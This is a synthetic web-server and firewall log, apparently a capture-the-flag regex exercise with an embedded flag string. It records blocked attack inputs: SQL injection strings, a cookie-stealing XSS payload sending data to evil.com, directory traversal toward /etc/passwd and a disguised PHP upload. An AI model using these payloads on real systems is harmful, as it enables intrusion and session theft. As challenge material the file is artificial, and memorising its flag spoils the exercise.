[2024-03-02 15:30:01] [INFO] System startup completed successfully
[2024-03-02 15:30:05] [INFO] Web Application Firewall initialized with ruleset v2.1.4
[2024-03-02 15:35:22] [WARN] Rate limit exceeded for IP: 45.33.12.234
[2024-03-02 15:36:11] [ERROR] Failed login attempt from IP: 192.168.1.105 - Username: admin
[2024-03-02 15:36:15] [WARN] SQL Injection attempt detected: ' OR '1'='1
[2024-03-02 15:37:02] [ERROR] Invalid request format: Content-Type must be application/json
[2024-03-02 15:37:45] [INFO] User authentication successful - Session: a7f392b1c9d8
[2024-03-02 15:38:12] [DEBUG] Cache miss for key: user_preferences_123
[2024-03-02 15:38:55] [WARN] Pattern match: /admin/config.php?id=1 OR 1=1
[2024-03-02 15:39:23] [ERROR] Database connection timeout after 30 seconds
[2024-03-02 15:40:01] [INFO] Scheduled maintenance started - Backup process initiated
[2024-03-02 15:40:15] [DEBUG] API rate limit: 95/100 requests remaining
[2024-03-02 15:41:03] [WARN] Cross-site scripting (XSS) attempt blocked: <script>document.location='http://evil.com/steal.php?cookie='+document.cookie;</script>
[2024-03-02 15:41:33] [ERROR] File upload rejected - Invalid file type: exploit.php.jpg
[2024-03-02 15:42:10] [INFO] Configuration reload triggered by admin user
[2024-03-02 15:42:31] [ERROR] Failed login attempt from IP: 192.168.1.105
[2024-03-02 15:42:35] [WARN] Pattern match: /admin/config.php?id=1 OR 1=1
[2024-03-02 15:42:40] [INFO] User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
[2024-03-02 15:42:42] [ERROR] Matched malicious pattern in request: <script>alert(1)</script>
[2024-03-02 15:42:45] [WARN] Email validation failed: test@example..com
[2024-03-02 15:42:50] [DEBUG] Processing request: GET /api/v1/users?id=[0-9]+
[2024-03-02 15:42:55] [INFO] Found pattern match in /var/log/auth.log: ieeecyber{regex_1_flag}
[2024-03-02 15:43:01] [ERROR] Invalid email format: user@.com
[2024-03-02 15:43:05] [WARN] URL pattern mismatch: http:/example.com
[2024-03-02 15:43:10] [INFO] Regex validation passed for: admin@company.com
[2024-03-02 15:43:15] [DEBUG] Pattern extraction failed for: {malformed[json}data]
[2024-03-02 15:43:20] [ERROR] Invalid IPv4 format: 256.1.2.3
[2024-03-02 15:43:45] [WARN] Directory traversal attempt: ../../etc/passwd
[2024-03-02 15:44:12] [ERROR] Memory usage exceeded threshold: 85%
[2024-03-02 15:44:33] [INFO] Backup completed successfully - 1.2GB data processed
[2024-03-02 15:45:01] [DEBUG] Cache invalidation triggered for user sessions
[2024-03-02 15:45:22] [WARN] Suspicious POST data detected: base64_encoded_payload
[2024-03-02 15:45:55] [ERROR] SSL Certificate validation failed for api.external-service.com
[2024-03-02 15:46:18] [INFO] System health check: CPU: 45%, Memory: 78%, Disk: 62%
[2024-03-02 15:46:44] [DEBUG] GraphQL query complexity exceeded limit
[2024-03-02 15:47:10] [WARN] CORS policy violation from origin: http://malicious-site.com
[2024-03-02 15:47:35] [ERROR] Redis connection failed - Failover initiated
[2024-03-02 15:48:02] [INFO] Load balancer redistributing traffic - Node 2 offline
[2024-03-02 15:48:25] [DEBUG] JWT token expired: eyJhbGciOiJIUzI1NiIs...
[2024-03-02 15:48:50] [WARN] Brute force protection activated for IP: 91.234.56.78
[2024-03-02 15:49:15] [ERROR] ElasticSearch cluster health: RED - 2 shards unassigned
[2024-03-02 15:49:40] [INFO] CDN purge initiated for /assets/* path
[2024-03-02 15:50:05] [DEBUG] WebSocket connection terminated unexpectedly
[2024-03-02 15:50:30] [WARN] API version v1 deprecated - Update required
[2024-03-02 15:50:55] [ERROR] Kubernetes pod crash loop - Backend service unavailable
[2024-03-02 15:51:20] [INFO] Firewall rules updated - 25 new rules added
[2024-03-02 15:51:45] [DEBUG] OAuth2 token refresh failed for client_id: 8a7b6c5d
[2024-03-02 15:52:10] [WARN] Rate limit warning: 95% of quota used
[2024-03-02 15:52:35] [ERROR] MongoDB replication lag exceeds 10 seconds
[2024-03-02 15:53:00] [INFO] Automated security scan completed - 3 medium vulnerabilities found
[2024-03-02 15:53:25] [DEBUG] Cron job failed: daily_metrics_aggregation
[2024-03-02 15:53:50] [WARN] TLS 1.0 connection attempt blocked
[2024-03-02 15:54:15] [ERROR] Maximum file upload size exceeded: 15MB/10MB
[2024-03-02 15:54:40] [INFO] New user registration spike detected: 100/minute
[2024-03-02 15:55:05] [DEBUG] Cache hit ratio dropped below 75%
[2024-03-02 15:55:30] [WARN] Outdated WordPress plugin detected: contact-form v3.2.1
[2024-03-02 15:55:55] [ERROR] SMTP server connection timeout
[2024-03-02 15:56:20] [INFO] Automated database backup started
[2024-03-02 15:56:45] [DEBUG] GraphQL introspection query detected
[2024-03-02 15:57:10] [WARN] High CPU usage on worker process pid: 12345
[2024-03-02 15:57:35] [ERROR] Failed to scale Kubernetes deployment: no available nodes
[2024-03-02 15:58:00] [INFO] SSL certificate renewal successful
[2024-03-02 15:58:25] [DEBUG] Redis cache eviction: 1000 keys removed
[2024-03-02 15:58:50] [WARN] Suspicious file modification: /var/www/html/config.php
[2024-03-02 15:59:15] [ERROR] Authentication service unavailable - Fallback mode activated
[2024-03-02 15:59:40] [INFO] System update available: Security patch v2.3.4 